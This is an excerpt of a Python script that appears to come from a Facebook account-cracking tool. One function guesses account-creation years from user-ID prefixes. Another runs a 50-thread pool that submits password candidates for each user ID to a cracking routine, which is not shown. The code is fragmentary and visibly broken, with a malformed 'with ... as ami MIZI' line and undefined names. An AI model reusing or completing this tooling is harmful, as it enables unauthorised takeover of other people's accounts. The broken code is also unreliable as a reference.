...
def abidmybrother(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :MIZI = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :MIZI = '√ 2009'
        elif uid[:8] in ['10000000']        :MIZI = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:MIZI = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:MIZI = ' 2010'
        elif uid[:6] in ['100001']          :MIZI = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :MIZI = '√ 2011/2012'
        elif uid[:6] in ['100004']          :MIZI = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :MIZI = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :MIZI = '√ 2014/2015'
        elif uid[:6] in ['100009']          :MIZI = '√ 2015'
        elif uid[:5] in ['10001']           :MIZI = '√ 2015/2016'
        elif uid[:5] in ['10002']           :MIZI = '√ 2016/2017'
        elif uid[:5] in ['10003']           :MIZI = '√ 2018/2019'
        elif uid[:5] in ['10004']           :MIZI = '√ 2019/2020'
        elif uid[:5] in ['10005']           :MIZI = '√ 2020'
        elif uid[:5] in ['10006','10007','']:MIZI = '√ 2021'
        elif uid[:5] in ['10008']           :MIZI = '√ 2022'
        elif uid[:5] in ['10009']           :MIZI = '√ 2023'
        else:MIZI=''
...
def deku():
    ...
    with ThreadPool(max_workers=50) as ami MIZI:
        clear()
        tl = str(len(user))
        ...
        for vaiya in user:
            ...
            for Lol in Mariya:
                pwx.append(Lol)
                pwx.append(vaiya)
            amiMIZI.submit(rcrack,uid,pwx,tl)
